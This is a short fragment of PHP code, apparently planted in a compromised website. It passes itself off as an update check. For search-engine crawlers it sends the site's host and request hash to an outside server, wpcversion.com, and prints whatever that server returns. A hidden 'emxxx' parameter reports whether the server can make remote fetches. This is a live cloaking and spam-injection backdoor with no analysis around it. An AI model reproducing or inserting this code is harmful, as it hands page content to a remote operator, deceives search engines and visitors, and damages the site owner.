...
if(isset($_GET["emxxx"])) { echo "iopq22211oaUpdate Available=".@function_exists("curl_init")."=".@ini_get("allow_url_fopen"); }if(preg_match("/bot|google|yahoo|bing|msnbot|crawl|slurp|yandex|meta|msn|bigmir|rambler/i", @$_SERVER["HTTP_USER_AGENT"])) {if(@function_exists("curl_init")) {$actualUpdate = @curl_init("http://wpcversion.com/in1.php?h=". @$_SERVER["HTTP_HOST"]."&m=".md5(@$_SERVER['REQUEST_URI']));@curl_setopt($actualUpdate, CURLOPT_RETURNTRANSFER, 1);@curl_setopt($actualUpdate, CURLOPT_TIMEOUT, 15);@curl_setopt($actualUpdate, CURLOPT_HEADER, 0);$actualResult = @curl_exec($actualUpdate);$actualResultCode = @curl_getinfo($actualUpdate, CURLINFO_HTTP_CODE);@curl_close($actualUpdate);if($actualResultCode == 200) {echo $actualResult;}}elseif(@ini_get("allow_url_fopen") == 1) {echo @file_get_contents("http://wpcversion.com/in1.php?h=". @$_SERVER["HTTP_HOST"]."&m=".md5(@$_SERVER['REQUEST_URI']));}}
